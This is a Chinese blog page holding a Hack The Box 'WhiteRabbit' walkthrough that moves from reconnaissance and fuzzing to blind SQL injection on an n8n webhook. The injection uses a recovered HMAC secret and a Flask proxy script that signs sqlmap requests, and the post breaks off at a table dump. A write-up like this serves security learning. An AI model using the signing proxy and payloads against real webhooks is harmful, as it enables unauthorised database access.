<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录生活和学习的点滴" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.png" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/a685d3b506a102e3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/a685d3b506a102e3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14467d077592c8ff.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-e880f70bf6d2a078.js" defer=""></script><script src="/_next/static/I7RFF_hwjEIRgLZZuazsl/_buildManifest.js" defer=""></script><script src="/_next/static/I7RFF_hwjEIRgLZZuazsl/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-[MesloLGL] font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 font-[MesloLGL] grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-WhiteRabbit","contentHtml":"\u003ch1\u003eSeason7-WhiteRabbit\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/competitive/7/overview\"\u003ehttps://app.hackthebox.com/competitive/7/overview\u003c/a\u003e | \u003ccode\u003eInsane\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -min-rate 10000 -p- 10.10.11.63\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:29 EDT\nWarning: 10.10.11.63 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e whiterabbit.htb (10.10.11.63)\nHost is up (0.30s latency).\nNot shown: 34479 filtered tcp ports (no-response), 31053 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 150.51 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将 \u003ccode\u003ewhiterabbit.htb\u003c/code\u003e 写入 hosts 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  nmap -sT -A -T4 -O -p 22,80,2222 10.10.11.63\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-06 23:32 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e whiterabbit.htb (10.10.11.63)\nHost is up (0.45s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)\n|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)\n80/tcp   open  http    Caddy httpd\n|_http-title: White Rabbit - Pentesting Services\n|_http-server-header: Caddy\n2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)\n|_  256 ad:42:c0:28:77:\u003cspan class=\"hljs-built_in\"\u003edd\u003c/span\u003e:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   457.81 ms 10.10.16.1\n2   294.36 ms whiterabbit.htb (10.10.11.63)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务，\u003ccode\u003ecaddy\u003c/code\u003e 搭建的 web\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  whatweb whiterabbit.htb                     \nhttp://whiterabbit.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.10.11.63], Script, Title[White Rabbit - Pentesting Services]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再爆一下子域名，爆出来 \u003ccode\u003estatus.whiterabbit.htb\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster vhost -u http://whiterabbit.htb --append-domain -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://whiterabbit.htb\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e VHOST enumeration mode\n===============================================================\nFound: status.whiterabbit.htb Status: 302 [Size: 32] [--\u003e /dashboard]\nFound: status.whiterabbit.htb Status: 302 [Size: 32] [--\u003e /dashboard]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e添加到 \u003ccode\u003ehosts\u003c/code\u003e ，再打开搭建的是 \u003ccode\u003eKuma\u003c/code\u003e (Uptime Kuma is an easy-to-use self-hosted monitoring tool.\u003c/p\u003e\n\u003cp\u003eUptime Kuma 是一个易于使用的自托管监控工具。)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e模糊测试\u003c/h2\u003e\n\u003cp\u003e在\u003ccode\u003ehttp://whiterabbit.htb\u003c/code\u003e 中无法找到任何有效信息\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eKuma\u003c/code\u003e 存在几个CVE，但是有的需要正常进入的凭据，或者就是难以利用\u003c/p\u003e\n\u003cp\u003e对 \u003ccode\u003ekuma\u003c/code\u003e 进行目录扫描，也没扫出来什么\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://status.whiterabbit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error --exclude-length 2444\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://status.whiterabbit.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   429,404,403,502\n[+] Exclude Length:          2444\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/screenshots          (Status: 301) [Size: 189] [--\u003e /screenshots/]\n/assets               (Status: 301) [Size: 179] [--\u003e /assets/]\n/upload               (Status: 301) [Size: 179] [--\u003e /upload/]\n/Screenshots          (Status: 301) [Size: 189] [--\u003e /Screenshots/]\n/metrics              (Status: 401) [Size: 0]\n/Upload               (Status: 301) [Size: 179] [--\u003e /Upload/]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e换个思路，我们对 \u003ccode\u003eKuma\u003c/code\u003e 的 Docs 进行检索 ：\u003ca href=\"https://github.com/louislam/uptime-kuma/wiki\"\u003ehttps://github.com/louislam/uptime-kuma/wiki\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e找到了 \u003cstrong\u003eStatus Page\u003c/strong\u003e ，格式为 \u003ccode\u003ehttp://example.com/status/default\u003c/code\u003e default 为特别的 slug\u003c/p\u003e\n\u003cp\u003e为什么找 \u003ccode\u003eStatus Page\u003c/code\u003e？因为监控需要提供 URl，提供的很有可能就是我们没有模糊测试出来的子域名\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从网上的文章中可以看到是自己配置的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e对其进行模糊测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl=38 -u http://status.whiterabbit.htb/status/FUZZ\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://status.whiterabbit.htb/status/FUZZ\nTotal requests: 220560\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                           \n=====================================================================\n\n000001471:   200        40 L     152 W      3359 Ch     \u003cspan class=\"hljs-string\"\u003e\"temp\"\u003c/span\u003e         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e模糊到\u003ccode\u003etemp\u003c/code\u003e ，访问一下，成功访问，并且找到子域名\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eddb09a8558c9.whiterabbit.htb\na668910b5514e.whiterabbit.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e都去访问一下\u003ccode\u003ea668910b5514e.whiterabbit.htb\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在下面能找到：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e下载 \u003ccode\u003ejson\u003c/code\u003e 文件查看（喂给GPT），这是 \u003ccode\u003en8n\u003c/code\u003e 工作流\u003c/p\u003e\n\u003cp\u003e密钥，数据包上的\u003ccode\u003ex-gophish-signature: sha256=\u003c/code\u003e 就是通过密钥加密了\u003ccode\u003eBody\u003c/code\u003e后得到的，所以每构造一个数据包就要重新使用密钥对\u003ccode\u003eBody\u003c/code\u003e进行加密\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-string\"\u003e\"parameters\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"action\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"hmac\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"SHA256\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"value\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"={{ JSON.stringify(\u003cspan class=\"hljs-variable\"\u003e$json\u003c/span\u003e.body) }}\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"dataPropertyName\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"calculated_signature\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"secret\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这个整个 JSON，要以 \u003cstrong\u003e字符串形式\u003c/strong\u003e 参与 HMAC 计算：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-perl\"\u003e\n{\u003cspan class=\"hljs-string\"\u003e\"campaign_id\"\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"email\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"test\u003cspan class=\"hljs-variable\"\u003e@ex\u003c/span\u003e.com\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Clicked Link\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e（注意：字段顺序不能变，空格会影响计算）\u003c/p\u003e\n\u003ch2\u003eSQL 注入\u003c/h2\u003e\n\u003cp\u003e这一处可能存在\u003ccode\u003eSQL\u003c/code\u003e注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-string\"\u003e\"parameters\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"operation\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"executeQuery\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"query\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"SELECT * FROM victims where email = \\\"{{ \u003cspan class=\"hljs-variable\"\u003e$json\u003c/span\u003e.body.email }}\\\" LIMIT 1\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"options\"\u003c/span\u003e: {}\n      },\n.....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e触发的是对应的数据包\u003ccode\u003eWebhook\u003c/code\u003e上的\u003ccode\u003eemail\u003c/code\u003e参数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePOST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1\nHost: 28efa8f7df.whiterabbit.htb\nx-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/json\nContent-Length: 81\n\n{\n  \u003cspan class=\"hljs-string\"\u003e\"campaign_id\"\u003c/span\u003e: 1,\n  \u003cspan class=\"hljs-string\"\u003e\"email\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"test@ex.com\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Clicked Link\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003e28efa8f7df.whiterabbit.htb\u003c/code\u003e添加到\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e构造数据包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\u003cspan class=\"hljs-string\"\u003e\"campaign_id\"\u003c/span\u003e:2,\u003cspan class=\"hljs-string\"\u003e\"email\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"test\\\" -- -\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Clicked Link\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造\u003ccode\u003esha256\u003c/code\u003e，使用\u003ccode\u003ecyberchef\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e闭合成功，存在 \u003ccode\u003eSQL\u003c/code\u003e 注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-WhiteRabbit/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看回显是无法使用联合查询了，只能使用布尔盲注时间盲注之类的，并且手工测试难度高时间长\u003c/p\u003e\n\u003cp\u003e编写脚本（参考大佬的脚本改编的，学习思路）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport hmac\nimport hashlib\nimport json\nimport flask\nimport requests\napp = flask.Flask(__name__)\n\nurl = \u003cspan class=\"hljs-string\"\u003e'http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'\u003c/span\u003e\nsecret = \u003cspan class=\"hljs-string\"\u003e\"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS\"\u003c/span\u003e\n\ndata = {\n    \u003cspan class=\"hljs-string\"\u003e\"campaign_id\"\u003c/span\u003e: 2,\n    \u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Clicked Link\"\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# 开启 Flask 服务器，将 sqlmap 的请求通过 Flask 传递到靶机上\u003c/span\u003e\n@app.route(\u003cspan class=\"hljs-string\"\u003e'/webhook'\u003c/span\u003e, methods=[\u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e])\ndef _():\n    \u003cspan class=\"hljs-comment\"\u003e# 首先检查参数email是否存在\u003c/span\u003e\n    email = flask.request.values.get(\u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e email is None:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e flask.abort(400)\n    try:\n        \u003cspan class=\"hljs-comment\"\u003e# 存在则拼接 data\u003c/span\u003e\n        e = data.copy()\n        e[\u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e] = email\n        new_data = json.dumps(e, separators=(\u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e))\n        \u003cspan class=\"hljs-comment\"\u003e# 生成签名\u003c/span\u003e\n        signature = hmac.new(\n            secret.encode(),\n            new_data.encode(),\n            hashlib.sha256\n        ).hexdigest()\n        \u003cspan class=\"hljs-comment\"\u003e# 设置头部\u003c/span\u003e\n        headers = {\u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'application/json'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'x-gophish-signature'\u003c/span\u003e: f\u003cspan class=\"hljs-string\"\u003e\"sha256={signature}\"\u003c/span\u003e}\n        \u003cspan class=\"hljs-comment\"\u003e# 使用参数请求靶机\u003c/span\u003e\n        r = requests.post(url, data=new_data, headers=headers)\n        \u003cspan class=\"hljs-comment\"\u003e# 将响应返回给Sqlmap\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(r.text)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e r.text\n    except Exception as e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e flask.abort(400)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    app.run(host=\u003cspan class=\"hljs-string\"\u003e'0.0.0.0'\u003c/span\u003e, port=5000, debug=True)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython sql.py\nsqlmap -u 127.0.0.1:5000/webhook?email=\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e --level=5 --risk=3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e超级慢\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/whiterabbit  sqlmap -u \u003cspan class=\"hljs-string\"\u003e\"127.0.0.1:5000/webhook?email=test\"\u003c/span\u003e --level=5 --risk=3 --dbms=mysql --technique=B\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.8.11#stable}\n|_ -| . [\u003cspan class=\"hljs-string\"\u003e\"]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 05:36:21 /2025-04-07/\n\n[05:36:21] [INFO] testing connection to the target URL\n[05:36:30] [INFO] testing if the target URL content is stable\n[05:36:34] [INFO] target URL content is stable\n[05:36:34] [INFO] testing if GET parameter 'email' is dynamic\n[05:36:37] [WARNING] GET parameter 'email' does not appear to be dynamic\n[05:36:44] [INFO] heuristic (basic) test shows that GET parameter 'email' might be injectable (possible DBMS: 'MySQL')\n[05:36:48] [INFO] testing for SQL injection on GET parameter 'email'\n[05:36:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[05:39:24] [WARNING] reflective value(s) found and filtering out\n[05:45:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[05:51:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n[05:57:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[05:57:57] [INFO] GET parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable \n[05:57:57] [INFO] checking if the injection point on GET parameter 'email' is a false positive\n\nsqlmap identified the following injection point(s) with a total of 331 HTTP(s) requests:\n---\nParameter: email (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: email=test\"\u003c/span\u003e AND 5729=(SELECT (CASE WHEN (5729=5729) THEN 5729 ELSE (SELECT 2985 UNION SELECT 6251) END))-- -\n---\n[06:03:10] [INFO] testing MySQL\n[06:03:15] [INFO] confirming MySQL\n[06:03:29] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL \u003e= 5.0.0 (MariaDB fork)\n[06:03:34] [INFO] fetched data logged to text files under \u003cspan class=\"hljs-string\"\u003e'/root/.local/share/sqlmap/output/127.0.0.1'\u003c/span\u003e\n\n[*] ending @ 06:03:34 /2025-04-07/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过表查询的到下面的表内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eDatabase: temp\nTable: command_log\n[6 entries]\n+----+---------------------+------------------------------------------------------------------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e                | \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e                                                                      